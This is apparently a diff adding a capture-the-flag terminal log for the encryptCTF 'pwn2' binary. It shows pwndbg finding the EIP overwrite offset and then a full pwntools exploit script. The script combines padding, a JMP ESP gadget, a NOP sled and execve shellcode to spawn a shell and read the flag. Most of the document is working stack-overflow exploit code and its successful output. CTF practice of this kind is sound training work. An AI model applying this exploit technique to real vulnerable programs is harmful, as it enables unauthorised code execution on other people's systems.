@@ -1,0 +1,132 @@
+pwndbg> cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+pwndbg> run
+Starting program: /app/pwn2
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+$ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+bash: command not found: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+Bye!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+──────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────
+ EAX  0
+ EBX  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
+ ECX  0xf7fb09b4 (_IO_stdfile_1_lock) ◂— 0
+ EDX  1
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
+ ESI  0xffffd7c4 —▸ 0xffffd8e0 ◂— '/app/pwn2'
+ EBP  0x6161616b ('kaaa')
+ ESP  0xffffd710 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+ EIP  0x6161616c ('laaa')
+────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────
+Invalid address 0x6161616c
+
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
+00:0000│ esp 0xffffd710 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+01:0004│     0xffffd714 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+02:0008│     0xffffd718 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+03:000c│     0xffffd71c ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+04:0010│     0xffffd720 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
+05:0014│     0xffffd724 ◂— 'raaasaaataaauaaavaaawaaaxaaayaaa'
+06:0018│     0xffffd728 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
+07:001c│     0xffffd72c ◂— 'taaauaaavaaawaaaxaaayaaa'
+──────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────
+ ► 0 0x6161616c None
+   1 0x6161616d None
+   2 0x6161616e None
+   3 0x6161616f None
+   4 0x61616170 None
+   5 0x61616171 None
+   6 0x61616172 None
+   7 0x61616173 None
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> cyclic -l laaa
+Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
+Found at offset 44
+pwndbg> exit
+root@6a3381e1be02:/app# python3 exploit.py
+[*] '/app/pwn2'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x8048000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+[+] Shellcode assemblato! (25 bytes)
+[+] Indirizzo JMP ESP trovato: 0x8048544
+[+] Starting local process './pwn2': pid 100
+[*] Payload inviato! Incrociamo le dita...
+[*] Switching to interactive mode
+bash: command not found: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD\x85\x04\x08\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0Ph//shh/bin\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b̀
+Bye!
+$ ls
+HINTS  description.txt	flag.txt  pwn2.c    pwn2.id1  pwn2.nam	shellcode.nasm
+core   exploit.py	pwn2	  pwn2.id0  pwn2.id2  pwn2.til
+$ cat flag.txt
+encryptCTF{N!c3_j0b_jump3R}
+$ cat exploit.py
+from pwn import *
+
+def get_shellcode(filename):
+    with open(filename + ".nasm", "r") as f:
+        lines = f.readlines()
+
+    # Rimuove tutto quello che c'è dopo un ';' in ogni riga
+    clean_code = ""
+    for line in lines:
+        clean_code += line.split(';')[0] + "\n"
+
+    # Adesso asm() non vedrà più i commenti problematici
+    raw_shellcode = asm(clean_code)
+    log.success(f"Shellcode assemblato! ({len(raw_shellcode)} bytes)")
+    return raw_shellcode
+
+context.update(arch='i386', os='linux')
+elf = ELF('./pwn2')
+
+# Ora carichiamo lo shellcode direttamente dal sorgente .nasm
+shellcode = get_shellcode("shellcode")
+
+try:
+    # Cerchiamo il gadget nel binario
+    jmp_esp = next(elf.search(asm('jmp esp')))
+except StopIteration:
+    try:
+        jmp_esp = next(elf.search(asm('call esp')))
+    except StopIteration:
+        log.error("Nessun gadget JMP ESP o CALL ESP trovato!")
+
+log.success(f"Indirizzo JMP ESP trovato: {hex(jmp_esp)}")
+
+
+# 4. Costruisci il payload
+# Offset 32 (buffer) + 4 (EBP) = 36 byte
+padding = b"A" * 44
+eip = p32(jmp_esp)
+# Aggiungiamo qualche NOP per sicurezza (NOP Sled)
+nop_sled = b"\x90" * 16
+
+payload = padding + eip + nop_sled + shellcode
+
+# 5. Esecuzione
+p = process('./pwn2')
+
+p.recvuntil(b"$ ") # Aspetta il prompt del programma
+p.sendline(payload)
+
+log.info("Payload inviato! Incrociamo le dita...")
+p.interactive()
